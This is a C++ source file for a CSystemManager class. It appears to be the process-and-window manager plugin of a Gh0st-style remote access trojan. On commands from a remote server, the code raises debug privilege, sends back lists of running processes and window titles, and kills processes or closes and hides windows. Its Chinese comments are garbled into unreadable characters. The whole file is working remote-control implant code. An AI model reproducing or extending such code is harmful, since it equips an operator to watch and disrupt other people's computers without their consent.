// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "SystemManager.h"
#include "Common.h"
#include <IOSTREAM>
#include <TLHELP32.H>

#ifndef PSAPI_VERSION
#define PSAPI_VERSION 1
#endif

#include <Psapi.h>

#pragma comment(lib,"psapi.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(IOCPClient* ClientObject,BOOL bHow, void* user):CManager(ClientObject)
{
	if (bHow==COMMAND_SYSTEM)
	{
		//����
		SendProcessList();
	}
	else if (bHow==COMMAND_WSLIST)
	{
		//����
		SendWindowsList(); 
	}
}

VOID CSystemManager::SendProcessList()
{
	LPBYTE	szBuffer = GetProcessList();            //�õ������б������
	if (szBuffer == NULL)
		return;	
	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);

	szBuffer = NULL;
}

void CSystemManager::SendWindowsList()
{
	LPBYTE	szBuffer = GetWindowsList();          //�õ������б������
	if (szBuffer == NULL)
		return;

	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));    //�����ض˷��͵õ��Ļ�����һ��ͷ�����
	LocalFree(szBuffer);	
}

LPBYTE CSystemManager::GetProcessList()
{
	DebugPrivilege(SE_DEBUG_NAME,TRUE);     //��ȡȨ��

	HANDLE          hProcess  = NULL;
	HANDLE			hSnapshot = NULL;
	PROCESSENTRY32	pe32 = {0};
	pe32.dwSize = sizeof(PROCESSENTRY32);
	char			szProcessFullPath[MAX_PATH] = {0};
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	DWORD           dwOffset = 0;
	DWORD           dwLength = 0;
	DWORD			cbNeeded = 0;
	HMODULE			hModules = NULL;   //�����е�һ��ģ��ľ��

	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //��ʱ����һ�»�����
	if (szBuffer == NULL)
		return NULL;
	szBuffer[0] = TOKEN_PSLIST;                      //ע�����������ͷ 
	dwOffset = 1;

	if(Process32First(hSnapshot, &pe32))             //�õ���һ������˳���ж�һ��ϵͳ�����Ƿ�ɹ�
	{	  
		do
		{      
			//�򿪽��̲����ؾ��
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
				FALSE, pe32.th32ProcessID);   //��Ŀ�����  
			{
				//ö�ٵ�һ��ģ����Ҳ���ǵ�ǰ��������·��
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//�õ��������������
				DWORD dwReturn = GetModuleFileNameEx(hProcess, hModules, 
					szProcessFullPath, 
					sizeof(szProcessFullPath));

				if (dwReturn==0)
				{
					strcpy(szProcessFullPath,"");
				}

				//��ʼ����ռ�õĻ������� ���ǹ������ķ��͵����ݽṹ
				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD) + 
					lstrlen(pe32.szExeFile) + lstrlen(szProcessFullPath) + 2;
				// ������̫С�������·�����
				if (LocalSize(szBuffer) < (dwOffset + dwLength))
					szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
					LMEM_ZEROINIT|LMEM_MOVEABLE);

				//����������memcpy�����򻺳����������� ���ݽṹ�� 
				//����ID+������+0+����������+0  ����
				//��Ϊ�ַ���������0 ��β��
				memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	

				memcpy(szBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;

				memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath) + 1);
				dwOffset += lstrlen(szProcessFullPath) + 1;
			}
		}
		while(Process32Next(hSnapshot, &pe32));      //�����õ���һ������
	}

	DebugPrivilege(SE_DEBUG_NAME,FALSE);  //��ԭ��Ȩ
	CloseHandle(hSnapshot);       //�ͷž�� 
	return szBuffer;
}

CSystemManager::~CSystemManager()
{
	Mprintf("ϵͳ����\n");
}

BOOL CSystemManager::DebugPrivilege(const char *szName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	//���� Token ����
	if (!OpenProcessToken(GetCurrentProcess(), 
		TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, szName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;	
}

VOID  CSystemManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_PSLIST:
		{
			SendProcessList();
			break;
		}
	case COMMAND_KILLPROCESS:
		{			
			KillProcess((LPBYTE)szBuffer + 1, ulLength - 1);			
			break;
		}	
	case COMMAND_WSLIST:
		{
			SendWindowsList();
			break;
		}

	case CMD_WINDOW_CLOSE:
		{
			HWND hWnd = *((HWND*)(szBuffer+1));

			::PostMessage(hWnd,WM_CLOSE,0,0); 

			Sleep(100);
			SendWindowsList(); 

			break;
		}
	case CMD_WINDOW_TEST:    //��������
		{
			TestWindow(szBuffer+1);  	
			break;
		}		
	default:
		{		
			break;
		}
	}
}

void CSystemManager::TestWindow(LPBYTE szBuffer)    //���ڵ���� ��С ���ض������ﴦ��
{
	DWORD Hwnd;
	DWORD dHow;
	memcpy((void*)&Hwnd,szBuffer,sizeof(DWORD));            //�õ����ھ��
	memcpy(&dHow,szBuffer+sizeof(DWORD),sizeof(DWORD));     //�õ����ڴ������
	ShowWindow((HWND__ *)Hwnd,dHow);
	//���ھ�� ��ɶ(�� С ���� ��ԭ)
}

VOID CSystemManager::KillProcess(LPBYTE szBuffer, UINT ulLength)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);  //��Ȩ

	for (int i = 0; i < ulLength; i += 4)
		//��Ϊ�����Ŀ��ܸ���ֹ��һ������
	{
		//�򿪽���
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(szBuffer + i));
		//��������
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);    //��ԭ��Ȩ
	// ����Sleep�£���ֹ����
	Sleep(100);
}

LPBYTE CSystemManager::GetWindowsList()
{
	LPBYTE	szBuffer = NULL;  //char* p = NULL   &p
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&szBuffer);  //ע�ắ��
	//���API�������������к���ָ����� 
	//������ϵͳע��һ�� �ص�����
	szBuffer[0] = TOKEN_WSLIST;
	return szBuffer;  	
}

BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //Ҫ���� **
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	szBuffer = *(LPBYTE *)lParam;  

	char	szTitle[1024];
	memset(szTitle, 0, sizeof(szTitle));
	//�õ�ϵͳ���ݽ����Ĵ��ھ���Ĵ��ڱ���
	GetWindowText(hWnd, szTitle, sizeof(szTitle));
	//�����ж� �����Ƿ�ɼ� �����Ϊ��
	if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
		return true;
	//ͬ���̹���һ������ע�����ķ��͵����ض˵����ݽṹ
	if (szBuffer == NULL)
		szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //��ʱ���仺���� 
	if (szBuffer == NULL)
		return FALSE;
	//[��Ϣ][4Notepad.exe\0]
	dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
	dwOffset = LocalSize(szBuffer);  //1
	//���¼��㻺������С
	szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	if (szBuffer == NULL)
		return FALSE;
	//��������memcpy���ܿ������ݽṹΪ hwnd+���ڱ���+0
	memcpy((szBuffer+dwOffset),&hWnd,sizeof(DWORD));
	memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);

	*(LPBYTE *)lParam = szBuffer;

	return true;
}
